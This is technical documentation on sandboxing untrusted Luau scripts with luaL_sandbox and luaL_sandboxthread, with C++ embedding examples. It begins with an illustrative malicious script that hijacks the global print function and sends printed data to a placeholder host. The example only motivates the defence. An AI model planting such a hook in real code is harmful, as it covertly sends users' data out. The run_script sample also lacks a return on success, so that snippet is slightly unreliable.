# Sandboxing

## The Problem

Consider loading untrusted Luau code. By default, all code will share the same global environment. If a malicious script decides to modify the global environment, this will affect all other scripts. Consider the following example:

```luau title="Malicious Script"
local p = _G.print
_G.print = function(...)
	-- Still log things out so it appears as if all is normal:
	p(...)

	-- Intercept all print statements and send them off somewhere:
	someHttpThing:Send("http_somewhere_bad", {...})
end
```

```luau title="Victim Script"
-- This seems to work, but the previous script has intercepted
-- the message and sent it off to some malicious website.
print("Hello!")
```

## Sandboxing State

Sandboxing creates a safer environment for potentially untrusted Luau code. When sandboxing is enabled, all libraries, built-in metatables, and globals are set to read-only. There are also some performance benefits to sandboxing, and thus it is recommended to always turn it on.

To turn on sandboxing, call `luaL_sandbox(L)` _after_ opening up libraries and _before_ loading any Luau code.

```cpp title="Sandboxing" hl_lines="4"
lua_State* L = luaL_newstate();
luaL_openlibs(L);

luaL_sandbox(L);
```

Now, if a malicous script attempts to modify the global state, an error will be thrown:

```luau title="Malicous Attempt"
-- Throws an error: "attempt to modify a readonly table" (in this case, the _G global table)
_G.print = function(...) end
```

However, we have introduced an undesired side-effect: We can now no longer create _anything_ within the global scope. Consider the following snippet of unharmful Luau:

```luau
function add(a: number, b: number)
	return a + b
end
```

This would _also_ throw the same error: `"attempt to modify a readonly table"`. In this particular example, writing `local function add(a, b)` would solve the issue. But this is enough friction to become problematic, especially for existing code. Thus, sandboxing our Luau state is not the final step. We need to do one more thing.

## Sandboxing Scripts

If we want our previous Luau code to work, we need to sandbox the _script_ thread too. We can do this with the `luaL_sandboxthread` function. This function will create a proxy to our global `_G`. This is done by creating a new table for `_G`, and then assigning a metatable which has an `__index` field pointing to the original `_G` table.

We want to do this _along_ with sandboxing our top-level state. Sandbox the Luau state with `luaL_sandbox`, and then sandbox each script execution with `luaL_sandboxthread`.

**Note:** This operation should be done per logical "script" and not for every single thread created. Doing this for every thread can lead to performance issues and also recursive depth errors, due to long `__index` chains to get back to the original `_G` table. Thus, only call `luaL_sandboxthread` for a thread that acts as the top-level state for a given script. Any threads created from this thread will also inherit this proxied global table.

```cpp title="Sandboxing Thread" hl_lines="7"
// Call run_script AFTER we have sandboxed our initial state
static int run_script(lua_State* L, const std::string& name, const std::string& bytecode) {
	// Create a thread to act as our script environment:
	lua_State* script = lua_newthread(L);

	// Sandbox it:
	luaL_sandboxthread(script);

	// Load our bytecode onto the script thread:
	int res = luau_load(script, (std::string("=") + name).c_str(), bytecode.data(), bytecode.length(), 0);

	if (res != 0) {
		// ...handle error
		return res;
	}

	// Run the script:
	int status = lua_resume(script, nullptr, 0);
	if (status != LUA_OK) {
		// ...handle error status or yield status
	}

	// Pop script thread off of 'L'
	lua_pop(L, 1);
}

static void example() {
	lua_State* L = luaL_newstate();
	luaL_openlibs(L);
	luaL_sandbox(L);

	std::string bytecode = compile_script(some_sourcecode);
	run_script(L, "example", bytecode);

	lua_close(L);
}
```

With this example, we can run multiple different scripts with `run_script`. Each script could modify their own global environment without affecting the global environment of other scripts. In other words, their environment has been sandboxed!
